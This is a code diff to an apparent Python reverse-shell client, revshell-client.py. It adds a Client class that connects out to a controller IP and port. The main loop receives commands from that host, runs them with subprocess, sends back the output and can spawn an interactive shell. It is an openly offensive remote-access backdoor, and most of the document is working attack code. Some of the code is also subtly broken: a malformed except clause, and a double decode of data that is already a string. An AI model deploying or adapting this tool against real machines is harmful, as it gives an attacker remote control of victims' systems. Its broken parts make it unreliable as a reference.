@@ -13,6 +13,50 @@ import threading
 
 BUFFER_SIZE = 1024 * 128
 
+HEAD = 64
+
+class Client:
+	def __init__(self):
+		try:
+			port = int(sys.argv[2])
+		except ValueError:
+			print("The given port is not a number.\n"
+				"Usage: python3 revshell-client.py <ip> <port>")
+			exit(1)
+
+		self.s = socket.socket()
+		try:
+			self.s.connect((sys.argv[1], port))
+		except (socket.error, exc):
+			print("[!] Couldn't connect to host.")
+			exit(1)
+
+	def send(self, msg):
+		msg = msg.encode()
+		try:
+			msg_size = str(len(msg)).encode()
+			msg_size += b' ' * (HEAD - len(msg_size))
+			self.s.sendall(msg_size)
+			self.s.sendall(msg)
+		except:
+			pass
+
+	def recvall(self, size):
+		ret = ''
+		while len(ret) < size:
+			ret += self.s.recv(size).decode()
+		return ret
+	
+	def recv(self):
+		msg_size = int(self.recvall(HEAD))
+		return self.recvall(msg_size).decode()
+
+	def get_client_socket(self):
+		return self.s
+
+	def __del__(self):
+		self.s.close()
+
 # Supposed to be a stable bash shell, works
 # on the client but not on the server
 
@@ -103,11 +147,11 @@ class FileTransfer:
 				f.write(data)
 
 
-def main(SERVER_HOST, SERVER_PORT):
-	s = socket.socket()
-	s.connect((SERVER_HOST, SERVER_PORT))
+def main():
+	client = Client()
+	s = client.get_client_socket()
 	while True:
-		command = s.recv(BUFFER_SIZE).decode().strip()
+		command = client.recv().strip()
 		if not command:
 			break
 		splitted_command = command.split(" ", 1)
@@ -135,7 +179,7 @@ def main(SERVER_HOST, SERVER_PORT):
 			spawn_shell(s)
 		else:
 			output = subprocess.getoutput(command)
-			s.send(output.encode())
+			client.send(output)
 	s.close()
 
 
@@ -143,4 +187,4 @@ if __name__ == '__main__':
 	if len(sys.argv) != 3:
 		print("Usage: python3 revshell-client.py <ip> <port>")
 		exit(1)
-	main(sys.argv[1], int(sys.argv[2]))
+	main()
